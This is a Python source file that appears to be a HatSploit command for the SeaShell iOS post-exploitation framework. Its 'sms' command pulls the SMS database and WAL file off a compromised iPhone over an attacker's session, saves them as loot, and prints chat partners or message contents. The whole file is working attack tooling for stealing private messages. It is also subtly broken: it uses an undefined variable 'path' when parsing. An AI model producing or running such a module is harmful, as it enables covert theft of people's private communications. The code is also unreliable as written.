"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

from seashell.lib.loot import Loot

from pex.db import DB
from pex.string import String

from hatsploit.lib.command import Command


class HatSploitCommand(Command):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "gather",
            'Name': "sms",
            'Authors': [
                'Ivan Nikolsky (enty8080) - command developer'
            ],
            'Description': "View device SMS for a partner.",
            'Usage': "sms [-l|<partner>]",
            'MinArgs': 1
        }

        self.db = DB()

        self.db_file = '/private/var/mobile/Library/SMS/sms.db'
        self.wal_file = '/private/var/mobile/Library/SMS/sms.db-wal'

    def run(self, argc, argv):
        if not self.session.download(
                self.db_file, Loot().specific_loot('sms.db')):
            return

        if not self.session.download(
                self.wal_file, Loot().specific_loot('sms.db-wal')):
            return

        if argv[1] == '-l':
            self.print_process("Parsing SMS chats...")

            try:
                chats = self.db.parse_sms_chats(path)
            except Exception:
                self.print_error(f"Failed to parse SMS chats!")
                return

            chats_data = []
            chat_id = 0

            for item in chats:
                chats_data.append((chat_id, item['guid'].split(';')[2]))
                chat_id += 1

            if chats_data:
                self.print_table(f"SMS chats", ('ID', 'Partner'), *chats_data)
            else:
                self.print_warning("No SMS chats available on device.")

            return

        self.print_process(f"Parsing SMS for {argv[1]}...")

        try:
            sms = self.db.parse_sms_chat(path, argv[1], imessage=False)
        except Exception:
            self.print_error(f"Failed to parse SMS for {argv[1]}!")
            return

        sms_data = []
        for item in sms:
            sms_data.append((
                item['data']['message_id'],
                String().time_normalize(item['data']['timestamp']),
                item['data']['text'],
            ))

        if sms_data:
            self.print_table(f"SMS ({argv[1]})", ('ID', 'Time', 'Text'), *sms_data)
        else:
            self.print_warning(f"No SMS data available for {argv[1]}.")
